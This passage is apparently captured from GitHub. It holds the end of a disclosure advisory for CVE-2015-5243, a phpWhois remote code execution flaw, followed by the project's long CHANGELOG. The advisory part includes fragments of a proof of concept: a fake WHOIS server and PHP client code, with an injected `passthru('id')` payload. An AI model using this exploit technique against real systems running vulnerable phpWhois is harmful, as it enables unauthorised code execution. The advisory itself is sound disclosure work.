    server = SocketServer.ThreadingTCPServer(('127.0.0.1', 9999), WhoisHandler)
    server.serve_forever()
```

The following example sets up phpWhois to use the simulated WHOIS
server and requests information for `example.org`:

```
<?php
require_once(__DIR__ . '/vendor/autoload.php');

$whois = new phpWhois\Whois;
$whois->useServer('org', '127.0.0.1:9999');
echo $whois->lookup('example.org');
```

Therefore, the vulnerable phpWhois version executes the injected PHP
statement `passthru('id')` which will execute the Unix `id` command on the
server and return its output.

## Timeline

* `2018-04-25`: identification of vulnerability
* `2018-04-26`: initial contact of several phpWhois and fork maintainers
* `2018-04-26`: disclosed vulnerability to phpwhois.org project maintainer
* `2018-04-27`: disclosed vulnerability to jsmitty12
* `2018-04-30`: phpwhois.org project maintainer stated that it is a
  known issue (CVE-2015-5243) with a fix committed at
  <https://github.com/sparc/phpWhois.org>
* `2018-04-30`: fix is not released yet and MITRE lists CVE-2015-5243
  as assigned but private
* `2018-05-29`: jsmitty12 released fixed version 5.1.0
* `2018-08-01`: public disclosure

## References

* Original advisory: <https://blog.nettitude.com/uk/cve-2015-5243-phpwhois-remote-code-execution>
* Fixes:
  + <https://github.com/sparc/phpWhois.org/commit/5cc572490c9053d46598ec9348a11e36a5a33a46#diff-f150ae17da7341bf6c2eff928684b3a3>
  + <https://github.com/Gemorroj/phpwhois/commit/91c937e03c876ba1290b6de2a3ad953d2105fdd0>
  + <https://github.com/jsmitty12/phpWhois/commit/863ccf62824f9998099ed20c2952ec8953ce3d06>

## Credits

* Original advisory by Iain Wallace ([Nettitude](https://www.nettitude.com/))
* Rediscovered by David Gnedt ([SBA Research](https://www.sba-research.org/))

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_834ab7cc_20250125_044244.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fjsmitty12%2FphpWhois%2Fblob%2Fmaster%2FCHANGELOG.md)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fjsmitty12%2FphpWhois%2Fblob%2Fmaster%2FCHANGELOG.md)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=jsmitty12%2FphpWhois)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[jsmitty12](/jsmitty12)
/
**[phpWhois](/jsmitty12/phpWhois)**
Public

forked from [phpWhois/phpWhois](/phpWhois/phpWhois)

* [Notifications](/login?return_to=%2Fjsmitty12%2FphpWhois) You must be signed in to change notification settings
* [Fork
  20](/login?return_to=%2Fjsmitty12%2FphpWhois)
* [Star
   56](/login?return_to=%2Fjsmitty12%2FphpWhois)

* [Code](/jsmitty12/phpWhois)
* [Issues
  14](/jsmitty12/phpWhois/issues)
* [Pull requests
  6](/jsmitty12/phpWhois/pulls)
* [Actions](/jsmitty12/phpWhois/actions)
* [Projects
  0](/jsmitty12/phpWhois/projects)
* [Wiki](/jsmitty12/phpWhois/wiki)
* [Security](/jsmitty12/phpWhois/security)
* [Insights](/jsmitty12/phpWhois/pulse)

Additional navigation options

* [Code](/jsmitty12/phpWhois)
* [Issues](/jsmitty12/phpWhois/issues)
* [Pull requests](/jsmitty12/phpWhois/pulls)
* [Actions](/jsmitty12/phpWhois/actions)
* [Projects](/jsmitty12/phpWhois/projects)
* [Wiki](/jsmitty12/phpWhois/wiki)
* [Security](/jsmitty12/phpWhois/security)
* [Insights](/jsmitty12/phpWhois/pulse)

## Files

 master
## Breadcrumbs

1. [phpWhois](/jsmitty12/phpWhois/tree/master)
/
# CHANGELOG.md

Copy path Blame  Blame
## Latest commit

## History

[History](/jsmitty12/phpWhois/commits/master/CHANGELOG.md)1339 lines (1099 loc) · 38.8 KB master
## Breadcrumbs

1. [phpWhois](/jsmitty12/phpWhois/tree/master)
/
# CHANGELOG.md

Top
## File metadata and controls

* Preview
* Code
* Blame

1339 lines (1099 loc) · 38.8 KB[Raw](https://github.com/jsmitty12/phpWhois/raw/refs/heads/master/CHANGELOG.md)
## 6.0.2 - 2020-12-28

* Include 5.6.5 in 6.0 branch (jsmitty12)

## 5.6.5 - 2020-12-28

* Remove line ending override for `.txt` fixtures (jsmitty12)
* Add tests for .ru domains (jsmitty12)
* Add test for .cat domains (jsmitty12)
* Add tests for .ch domains (jsmitty12)
* Add tests for .cn domains (jsmitty12)
* Add tests for .co domains (jsmitty12)
* Add tests for .co.za domains (jsmitty12)
* Add tests for .coop domains (jsmitty12)
* Add tests for .cz domains (jsmitty12)
* Add tests for .eu domains (jsmitty12)
* Add tests for .fi domains (jsmitty12)
* Add tests for .fj domains (jsmitty12)
* Add tests for .fm domains (jsmitty12)
* Add tests for .fr domains (jsmitty12)
* Add tests for .hu domains (jsmitty12)
* Add tests for .ie domains (jsmitty12)
* Stub tests for .il domains (jsmitty12)
* Stub tests for gtld afternic (jsmitty12)
* Add parser for .kiwi domains (jsmitty12)
* Fix whois server for .kiwi domains (sirvulcan)
* Synchronize Travis-CI config with `master` branch (jsmitty12)
* Set xdebug.mode=coverage via global environment variable (jsmitty12)

## 6.0.1 - 2020-12-10

* Revert using `algo26-matthias/idna-convert@dev-master`

## 6.0.0 - 2020-12-05

* Work around deprecated PHPUnit method
* Use `algo26-matthias/idna-convert@dev-master` while waiting for official PHP 8.0 support
* Simplify CI testing

## 6.0.0-rc1 - 2020-10-04

* Enable support for PHPUnit 8 & 9
* Require PHP >7.2

## 5.6.4 - 2020-10-03

* Improve support for `.co.uk` domains (TorbenLundsgaard)
* Improve support for `.ws` domains (sirvulcan)

## 5.6.3 - 2020-10-03

* Split fixture files the same way WhoisClient splits raw whois data (naitsirch)
* Rename handler for `.de` domains, add test cases (jsmitty12)
* Rename and fix handler for `.uk` domains, add test cases (jsmitty12)
* Update tests for `.us` domains, add test cases (jsmitty12)
* Rename handler for `.cl` domains, add test cases (jsmitty12)
* Rename handler for `.edu` domains, add test cases (jsmitty12)
* Rename handler for `.ae` domains, add test cases (jsmitty12)
* Rename handler for `.aero` domains, add test cases (jsmitty12)
* Rename handler for `.ag` domains, add test cases (jsmitty12)
* Rename handler for `.am` domains, add test cases (jsmitty12)
* Rename handler for `.app` domains, add test cases (jsmitty12)
* Rename handler for `.asia` domains, add test cases (jsmitty12)
* Rename handler for `.nic` domains, add test cases (jsmitty12)
* Rename handler for `.at` domains, add test cases (jsmitty12)
* Rename handler for `.au` domains, add test cases (jsmitty12)
* Rename handler for `.be` domains, add test cases (jsmitty12)
* Rename handler for `.bh` domains, add test cases (jsmitty12)
* Rename handler for `.biz` domains, add test cases (jsmitty12)
* Rename handler for `.br` domains, add test cases (jsmitty12)
* Fix date parsing in PHP 7.3 (jsmitty12)
* Add script to generate test fixtures (jsmitty12)

## 5.6.2 - 2020-05-31

* Fix parsing for `.ca` domains (maxiwheat, jsmitty12)
* Add support for `.london` domains (adamjimenez, jsmitty12)
* Add support for `.ph` domains (jsmitty12)
* Add support for `.dev` domains (jsmitty12)
* Add support for `.today` domains (jsmitty12)

## 5.6.1 - 2020-05-30

* Improve date parsing when a standard format is used (jsmitty12)

## 5.6.0 - 2020-05-11

* Officially support PHP 7.4 (TorbenLundsgaard, jsmitty12)
* Replace abandoned `mso/idna-convert` dependency
* Fix *Undefined index* notice in `.de` handler (naitsirch)

## 5.5.0 - 2018-11-26

* Test against PHP 7.3 and PHP 7.4 (nightly)

## 5.4.1 - 2018-11-26

* Remove roave/security-advisories from composer.json
* Add `whois()` helper function (TorbenLundsgaard)

## 5.4.0 - 2018-08-14

* Support .no domains (TorbenLundsgaard)

## 5.3.0 - 2018-08-13

* Support .dk domains (TorbenLundsgaard)
* Improve support for .se domains (TorbenLundsgaard)

## 5.2.0 - 2018-07-21

* Support .app domains (fideloper)

## 5.1.0 - 2018-05-29

* Fix broken CI build (#20)
* Fix CVE-2015-5243 (#19)

## 5.0.2 - 2018-04-27

* Fix a broken variable reference in GTLD fastdomain handler
* Update the license to GPL 2.0+
* Update `composer.json` and `README.md` to reference this project instead of the original

## 5.0.1 - 2018-01-18

* Correctly retrieve expiration date in GTLD handler
* Fix retrieval of .uk expiry date
* Replace broken foreach() construct in get\_blocks()

## 5.0.0 - 2017-12-21

* Disable support for non ICANN domains (Used new.net doesn't exist anymore)
* Configure TravisCI
* Eliminate PHP 4 constructors
* PHP 7.1 compatibility
* Fix inaccurate date formats for various TLDs
* Add additional parse strings for domain.sponsor, domain.changed, and domain.expires

## v4.2.5

* New whois servers

## 2011/07/09

* html & cosmetic changes in examples
* released version 4.2.2

## 2011/07/08

* fixes for arin (bug #3339783)
* fixed .nl handler (bug #3314404)
* fixed .ae whois server (bug #3354286)
* fixed bug #3333558
* .uk handler improvement (partial patch #3314417)
* added support for .gt domains (request #3353926)
* cosmetic fixes to many handlers (removed unuseful spaces, removed change history, regyinfo position unification,...)
* cira.ca,nicline are non UTF8

## 2011/06/26

* added handler for gandi (request #3155752)
* added handler for .cl
* corrected utf-8 support for .hu, .br and ripe
* fixes for .pl, .org.za, .be, .cz, .de, .fj, .it, .ch handlers
* nameservers are automatically searched if missing

## 2011/06/24

* fixed .be handler (bug #3307363)
* fixed ip.lacnic handler array handling
* fixed .eu hanlder (bug #3297823)
* fixed .ae handler (bug #3181964)
* fixed .uk handler (partial patch # 3314417)
* fixed .ru handler (bug #3178123)
* added handler for .ir

## 2011/01/26

* fixed .se handler (bug #3165639)

## 2011/01/24

* fixed .pe server (bug #3164251)

## 2011/01/17

* fixed .co handler (bug #3159317)
* fixed .ca handler (bug #3141475)

## 2010/12/06

* fixed .ca handler

## 2010/12/03

* fixed .pl handler

## 2010/11/29

* fixed .de handler

## 2010/11/22

* added handler for corporate domains (Kyle Brost)

## 2010/11/05

* added support for .ke domains

## 2010/09/20

* released version 4.2.1
* provided default object data for unsupported domains

## 2010/09/16

* fixed .si handler

## 2010/08/26

* UseServer can now be used for ip addresses

## 2010/08/24

* removed dangerous exec call

## 2010/08/23

* improved extra whois parameters for better support of .jp whois
* added handler for .jp
* added handler for .co
* added ipv6 support

## 2010/08/10

* joined common whois field list
* some minor fixes
* testsuite can now test specific handlers
* fixed iana handler
* improved generic\_parser\_b
* removed .es handler

## 2010/07/27

* better AS support
* ip handlers rewritten

## 2010/07/21

* added dnssec info to domain object
* parser improved
* better support for some non utf-8 servers
* removed buydomains handler
* added afternic handler
* fixes for many handlers

## 2010/07/20

* fixed arin new query format
* better ip refferal whois follow-up
* avoid double rwhois queries

## 2010/05/20

* added gtld handlers for domainpeople,dremhost,fastdomain, marmonitor & names4ever (by Brandon Whaley)

## 2010/04/28

* fixed gtld handler: some registrars give no information on pendingdelete domains that could appear as unregistered
* fixed bug #2991358 (owner not correctly set for .at domains)
* fixed bug #2991270 (added extra incorrect nameserver on .eu domains)
* fixed bug #2991265 (.org organization not parsed)

## 2010/04/13

* added .ly handler
* added .fj handler

## 2009/12/29

* released version 4.2.0
* added handler for .tel
* new easy\_parser funtion applied to many handlers
* fixes for several handlers
* stargateinc handler moved to namevault
* itsyourdomain seems to be now tucows
* domainbank is now handled by dotster
* domaincontender is now assorted
* fixed bug #2888773 validip function uses undefined variable
* improved .eu domain registration status detection
* fixes for html nice output and utf-8 support

## 2008/10/10

* fixed bug #2153003
* fixed bug #2153380 Bad info for joker.com domain owners

## 2008/09/07

* check network nserver too
* added suport for spanish dates
* fixed ws handler

## 2008/08/29

* fixed 'bold' regex and removed extra blank lines in showHTML result

## 2008/08/28

* fixed namespace in whois.ip.lib.php
* allow to specify full url in showHTML result

## 2008/08/20

* added .ve handler by jlchafardet
* fixed some handlers reporting 'bill' instead of 'billing'
* added helper functions for some handlers
* fixed .au handler

## 2008/08/11

* fixed .es handler

## 2008/07/08

* added handler for .su

## 2008/06/30

* added handler for .fi

## 2008/06/26

* added handler for .asia

## 2008/06/25

* fixed hangup bug on some non-responding rwhois servers (read result changed to non-blocking)

## 2008/06/16

* added support & handler for .me

## 2008/06/16

* fixed .fr handler

## 2008/06/11

* fixed .cz handler registered date
* fixed .fr handler
* added .ro handler

## 2008/05/28

* added handler for .it
* added handler for .fr

## 2008/05/17

* Added support for .ve
* Released version 4.1.3

## 2008/05/11

* fixed whois.museum

## 2008/05/09

* do not use handlers on error

## 2008/05/04

* improved nameserver detection (again)
* fixed whois.pl, whois.gtld.nominalia, whois.gtld.onlinenic, whois.ovh
* removed test for informe.ws
* minor fix to whois.gtld.enom
* minor chages to other handlers

## 2008/04/29

* improved nameserver detection (again)
* fixes & improvements on whois.mx

## 2008/04/28

* whois.za.php renamed to whois.zanet.php
* added support & handler for .org.za
* added handler for .co.za
* minor improvemts on whois.client.php to allow handlers for second level domains
* improved nameserver detection
* minor fix to .ie handler

## 2008/03/05

* dotregistrar is now part of dotster
* fixes in date parser
* .cz handler update
* fixed .ch whois server detection

## 2007/12/21

* fixed uninitialized variable in example.php
* fixes in publicdomainregistry and uk handlers
* improved regex for html output
* added support for centralnic domains
* added handler for .pt and .ae (pacth #1709470)
* fixed bug #1761156
* applied patch #1749389

## 2007/05/30

* removed support for .gr domains

## 2007/05/24

* uniform way to specify query array

## 2007/05/09

* fixed reporting of ip query information

## 2007/05/04

* fixes to ip handler and APNIC ip handler

## 2007/05/03

* minox fix in whois.gtld.publicdomainregistry.php
* removed unused handler whois.gtld.directi.php

## 2007/04/30

* fixed tucows/opensrs gtld handler detection
* more improvements and cleanup of whois.parser.php
* added gtld handler for Fabulous

## 2007/04/29

* several improvments on whois.parser
* several handlers fixed to work with improved parser
* added gtld handler for NameKing

## 2007/04/27

* rearranged regyinfo array
* better info reporting on ip whois

## 2007/04/26

* restrict .com/.net searches to domains
* regyinfo now contains a list of all servers servers contacted in key 'servers'
* improvements in contact data detection in whois.parser
* added gtld handler for OnlineNIC

## 2007/04/24

* added gtld handler for Wild West Domains
* utf8 fixes in example.php

## 2007/04/23

* added gtld handler for RRPPROXY

## 2007/04/21

* added gtld handler for NICCO

## 2007/04/20

* fixes and improvments in .pl handler
* improved IDNA support

## 2007/04/18

* fixed warnings in nicline and tmagnic gtld handlers
* added support for IDNA (internationalized) domains names as defined in RFC3490, RFC3491, RFC3492 and RFC3454 using Matthias Sommerfeld idna\_convert class

## 2007/04/17

* allow easy plugin for new gtld handlers
* minor improvement to testsuite.php
* fixed .se handler
* namesdirect has joined with dotster
* fixed tmagnic gtld handler

## 2007/04/16

* added basic support for .bz
* whois.info.php cosmetic changes
* added .ru handler
* support for multiple status lines in whois.org.php and whois.gtl.php
* removed whois.gtld.chdom handler
* allow easy plugin for new country handlers
* minor improvement to whois.client.php and whois.parser.php
* added gtld handler for OVH

## 2007/04/06

* fixed error in whois.ip.php

## 2007/03/30

* minor fix on whois.ip.php

## 2007/03/28

* some handlers where not seeting rawdata

## 2007/03/19

* Fixed nic.br ip handler detection

## 2007/03/05

* fixed .cat registered yes/no detection

## 2007/03/02

* minor fix to .eu handler
* fixes in arin ip handler

## 2007/02/06

* changed the way gTLD handlers are detected

## 2006/12/21

* fix/improvement for register.com handler

## 2006/12/20

* Released version 4.1.2

## 2006/12/19

* minor fixes to testsuite.php, whois.parser.php, whois.gtld.joker.php, whois.gtld.enom.php and whois.gtld.tvcorp.php
* updated .nl handler
* enom has mixed with bulregister, so bulkr gtl handler has been removed

## 2006/12/18

* minor fixes to whois.ca.php, whois.es.php, whois.gtld.iana.php, whois.gtld.opensrsnet.php, whois.ip.apnic.php, whois.biz.php, whois.gtld.psiusa.php, whois.parser.php, and whois.ch.php
* updated .lthandler
* added support and handler for .jobs

## 2006/09/29 David Saez david@ols.es

* Fixed .in whois server name
* Added handler for .in
* Added gtld handler for psiusa (Patch #1539553)
* Fixed .za.net handler
* testsuite domain listed updated
* ip handler improvments from bug #1533099

## 2006/09/07 David Saez david@ols.es

* Fixed register.com owner detection

## 2006/08/02 David Saez david@ols.es

* Fixed bug #1495871: failed to open stream

## 2006/07/25 David Saez david@ols.es

* enabled again .es handler

## 2006/06/23 David Saez david@ols.es

* fixed warning in whois.ip.afrinic
* added handler for .nz
* disabled .es handler
* Released version 4.1.1

## 2006/06/19 David Saez david@ols.es

* better handling of errors in whois.ip.php

## 2006/06/12 David Saez david@ols.es

* More PHP5 friendly (from Bug #1502777)
* rawdata reflects all rwhois output
* added suport and handler for .mobi

## 2006/05/31 David Saez david@ols.es

* Fixed bug #1495389

## 2006/05/16 David Saez david@ols.es

* added handler for .sc (thanx to Hans-Peter Kohnle)

## 2006/05/08 David Saez david@ols.es

* fixed exmaple.php
* fixed .pl and .de handler

## 2006/04/29 David Saez david@ols.es

* improved .edu handler
* testsuite finished
* proxy support
* added template for example.php

## 2006/04/28 David Saez david@ols.es

* fixed special non handled domains support
* added not supported domain .cy
* fixed typo in test.txt
* fixed directi handler detection
* improved whois.parser
* fixed joker handler
* minor fix to namejuice handler
* fixed krnic handler

## 2006/04/08 David Saez david@ols.es

* Added handler for .eu
* Minor fix to example.php
* Improved HTML output

## 2006/04/05 David Saez david@ols.es

* Added support for EPP status (bug #1463866)

## 2006/04/03 David Saez david@ols.es

* fixed timestamp style date detection

## 2006/03/29 David Saez david@ols.es

* fixed bad rwhois server/port detection
* added optional suport for non ICANN tld's

## 2006/03/24 David Saez david@ols.es

* added handler for NAMESDIRECT
* fixed register.com handler

## 2006/03/21 David Saez david@ols.es

* Fixed problems with some domains registered at enom

## 2006/03/20 David Saez david@ols.es

* Aplied fix to bug #1453935

## 2006/03/19 David Saez david@ols.es

* added gtld handler for namejuice (thanx to Robert Apgood rob@carpelaw.com)
* example.php is now XHTML 1.0 compliant

## 2006/03/14 David Saez david@ols.es

* fixed case detection on whois.parser.php

## 2006/03/10 David Saez david@ols.es

* added handler for .edu

## 2006/03/07 David Saez david@ols.es

* added gtld handler for alldomains
* more improvemnts on whois.parser.php

## 2006/03/06 David Saez david@ols.es

* added gtld handler for nominalia

## 2006/03/05 David Saez david@ols.es

* fixed .de handler
* .ca handler fixed and updated

## 2006/03/03 David Saez david@ols.es

* added handler for gtld domaincontender.com

## 2006/03/02 David Saez david@ols.es

* added handler for .pl and .ie
* minor fixes in whois.parser.php

## 2006/02/27 David Saez david@ols.es

* minor fixes for non-existing .es domains
* fixed ip2long PHP5 compatibility
* fixed sponsor detection on opensrsnet handler

## 2006/02/13 David Saez david@ols.es

* fixed nserver detection in whois.es.php

## 2006/02/03

* Released phpWhois 4.1.0

## 2006/02/03 David Saez david@ols.es

* fixed README documentation
* minor fixes to some handlers

## 2006/02/01 David Saez david@ols.es

* fixed README documentation
* improved .au handler for user with whois-check.ausregistry.net.au
* added testsuite for verifying handlers

## 2006/01/31 David Saez david@ols.es

* fixed lookup error on .co.za domains
* minor fix to whois.pareser.php

## 2006/01/27 David Saez david@ols.es

* added deep\_whois feature to get faster but less acurate results

## 2006/01/24 David Saez david@ols.es

* minor fixes to .es handler

## 2006/01/20 David Saez david@ols.es

* changed .es http based whois server
* added function to set specific whois servers
* updated .es handler
* formating fixes in whois.parser.php
* added handler for .cat

## 2006/01/18 David Saez david@ols.es

* minor fixes in enom handler

## 2006/01/13 David Saez david@ols.es

* updated .uk handler

## 2005/12/11 David Saez david@ols.es

* fixed some warnings in .de handler and added timeout detection

## 2005/12/10 David Saez david@ols.es

* fixed html output broken links

## 2005/12/01 David Saez david@ols.es

* fixed php warning with limbo domains in netsol

## 2005/11/21 David Saez david@ols.es

* added support for .pr domains
* fixed warning in whois.ip.afrinic.php
* added detection for netblocks transferred from RIPE to AFRINIC

## 2005/11/17 David Saez david@ols.es

* added support for .mt domains

## 2005/11/14 David Saez david@ols.es

* avoid some warnings on whois.gtld.bulkr.php

## 2005/11/11 David Saez david@ols.es

* removed support for .es domains
* some fixes in .uk handler

## 2005/11/07 David Saez david@ols.es

* added handler for .int domains
* added support for some other domains

## 2005/11/06 David Saez david@ols.es

* added support & handler for .travel
* showHTML made a bit more flexible

## 2005/10/31 David Saez david@ols.es

* better windows based php detection
* fixed registro.br detection

## 2005/10/21 David Saez david@ols.es

* added handler for Directi
* added handler for .cz domains

## 2005/10/20 David Saez david@ols.es

* added handler for gtld IANA
* updated .org handler

## 2005/10/15 David Saez david@ols.es

* added missing example for .ag and .name
* added multiple abuse email address detection in arin ip queries
* avoid adding empty fields in whois.parser.php
* added support and handler for .pro domains

## 2005/10/14 David Saez david@ols.es

* clean some messy ripe records
* added handler for .name

## 2005/10/12 David Saez david@ols.es

* added compatibility with PHP versions prior 4.3.0

## 2005/10/11 David Saez david@ols.es

* fixed warning for non-existant .es domains

## 2005/10/10 David Saez david@ols.es

* fixed some short tags in example.php
* fixed queries to .net whois server
* added support for .pe domains
* fixed .se registration detection
* added requirements section in README
* fix to let it work with PHP 4.1.0 - 4.3.1
* installation clarified
* thanx to Speedywise

## 2005/10/09

* Released phpWhois 4.0.1
* some files where missing !!

## 2005/10/04 David Saez david@ols.es

* fix for address reporting
* added handler for .coop

## 2005/09/30 David Saez david@ols.es

* fix for .museum handler
* added handler for .aero
* minor fix for date extraction in whois.parser.php

## 2005/09/29 David Saez david@ols.es

* added handler for .museum

## 2005/09/27 David Saez david@ols.es

* minor formating fix
* added handler for .lt

## 2005/09/13 David Saez david@ols.es

* better error handling in whois.gtld

## 2005/09/05 David Saez david@ols.es

* minor code cleaup on whois.gtld.php
* added better support for errors
* added hanlder for .ag
* added ip detection for HTML output
* country tld revision [ax-bx]

## 2005/09/01

* Released phpWhois 4.0.0

## 2005/08/31 David Saez david@ols.es

* changed behaviour of whois.utils.php
* changed url disclaimer
* added GPL license file
* whois.gtld.bulkr.php rewritten
* last minute fixes

## 2005/08/30 David Saez david@ols.es

* changed generic\_whois\_b item parameter array
* fixes & improvments for rwhois
* AS detection, added regyinfo.type subkey
* added abuse contact detection for ripe
* fixes for .se

## 2005/08/29 David Saez david@ols.es

* changed gif icon for a new png one
* recovered better example.php from old distribution
* utils.whois renamed to whois.utils.php
* removed obsolete FAQ item
* added nice HTML output capabilities to whois.utils.php
* fixed whois.ip.php
* added extra abuse email address detection for whois.ip.php
* addeed rwhois recognition for afrinic

## 2005/08/26 David Saez david@ols.es

* code cleanup and formatting
* added support form Referral Whois (rwhois)as per RFC 1714/2167, support is limited, non recursive and only for ARIN ip space

## 2005/08/19 David Saez david@ols.es

* fixed some bad includes

## 2005/07/29 David Saez david@ols.es

* fixed problem with lastest changes in whois.ip

## 2005/07/28 David Saez david@ols.es

* modified $query parameter for parse function

## 2005/07/27 David Saez david@ols.es

* genutil, generic2 and getdate moved to whois.parser.php
* cli\_example.php renamed to example.cli.php
* added handler.template.php
* disclaimer updated
* updated README file
* some improvments for AS queries
* some handlers reported zcode instead of pcode
* added support for AfriNIC (ip whois)
* updated HANDLERS documentation
* added support for CHINESEDOMAINS

## 2005/07/26 David Saez david@ols.es

* added handler for za.org & za.net, thanx to luca@clamav.net
* generic3.whois code moved to whois.parser.php

## 2005/07/25 David Saez david@ols.es

* removed unused file denic.whois
* added support for za.net and za.org, thanx to luca@clamav.net
* rewritte of .uk handler
* whois client code moved to whois.client.php
* class inheritence revised
* generic.whois moved to whois.parser.php

## 2005/07/22 David Saez david@ols.es

* added CDIR to inetnum conversion for ip whois and fixed brnic detection
* changed naming schema for gtld handlers

## 2005/07/19 David Saez david@ols.es

* changes on methods and variables of Whois class

## 2005/07/17 David Saez david@ols.es

* changed naming schema for country handlers

## 2005/07/16 David Saez david@ols.es

* normalized expired/created/chaged dates
* report non existant dns servers
* improved getdate.whois
* fixed benic.whois
* improvements to genric whois handling
* improvments & fixes to esnic, denic and brnic handlers
* added configurable timeout for sockec communications
* changed naming schema for ip handlers

## 2005/04/28 David Saez david@ols.es

* Fixed .fm handling
* normalized expired/created/chaged dates
* changed the way nservers are normalized
* some fixes
* adde CLI mode example

## 2005/03/14 David Saez david@ols.es

* added handler for TV CORPORATION

2005/03/03 David Saez david@ols.es

* minor fix to main.whois
* added some object fields when not set
* fixed handling of .tv

## 2005/03/02 David Saez david@ols.es

* fixed SRSPlus detection
* applied patch [ 981413 ] Whois Parameter Array thanx to mwelters
* added better reporting on nameservers
* better email reporting on generic3.whois

## 2005/03/01 David Saez david@ols.es

* fixed Network Solutions detection
* ordered list of handlers in gtld.whois
* added handler for Moniker
* added handler for Innerwise
* added handler for Stargate
* added handler for Cronon
* added handler for Joker
* fixed scripts using php short tags thanx to rpm@keynetics.com
* added handler for Schlund

## 2004/08/06 David Saez david@ols.es

* fixed denic.whois when domain does not exist, thanx to bjoern@xrow.de

## 2004/04/24 David Saez david@ols.es

* added .is handler
* added some notes about generic support functions in HANDLERS

## 2004/04/23 David Saez david@ols.es

* Fixed ending tag in all files

## 2004/04/22 David Saez david@ols.es

* added handler for .us , thanx to snguyen@mbaassociation.org
* correctly sets regyinfo.whois
* added hack for .net.au , thanx to thill@gumnut.com.au
* implemented request id 757465
* fixed bug 690623
* fixed bug 804595
* added feature request 759788
* added .bg http whois mserver
* added .hu handler

## 2004/04/21 David Saez david@ols.es

* fixed small bug in netsol.whois
* improvments and fixes to gtld.whois, thanx to snguyen@mbaassociation.org

## 2004/02/11 David Saez david@ols.es

* handles R120-LROR, thanx to DavHolle

## 2003/11/22 David Saez david@ols.es

* fix for .tv domains

## 2003/10/27 David Saez david@ols.es

* minor improvments to main.whois
* fix for .in domains

## 2003/10/01 Ross Golder ross@golder.org

* Released phpWhois version 3.0.6

## 2003/09/20 David Saez david@ols.es

* minor improvment to esnic.whois

## 2003/09/13 David Saez david@ols.es

* minor improvment to org.whois

## 2003/09/12 David Saez david@ols.es

* added gtld handler for Arsys nicline thanx to cgalvez@espaciowww.com
* minor fixes to main.whois and gtld.whois

## 2003/09/09 David Saez david@ols.es

* fixed some warning when ip is banned on domainbank.whois
* main.whois also sets regyinfo.whois on http queries
* rewrite of esnic.whois

## 2003/09/08 David Saez david@ols.es

* rewrite of cnnic.whois
* some fixes to wsnic.whois
* some fixes to gtld.whois and generic3.whois
* added handler for Godady and Domain Bank
* minor improvment to main.whois and generic2.whois
* added handler for .org

## 2003/09/06 David Saez david@ols.es

* Added handlers for .cn and .ws thanx to zingfharn@fastmail.fm
* Fixed main.whois to allow https queries
* Enabled .es queries but handler remains disabled because needs total rewrite

## 2003/08/04 David Saez david@ols.es

* Temporary deactivation of .es handler due to changes in .es registry whois system
* Fixed denic.whois, thanks to Gulibert@NetGameZone.de

## 2003/06/30 David Saez david@ols.es

* added handler for .be, thanx to onveilig@hotmail.com

## 2003/06/04 Ross Golder ross@golder.org

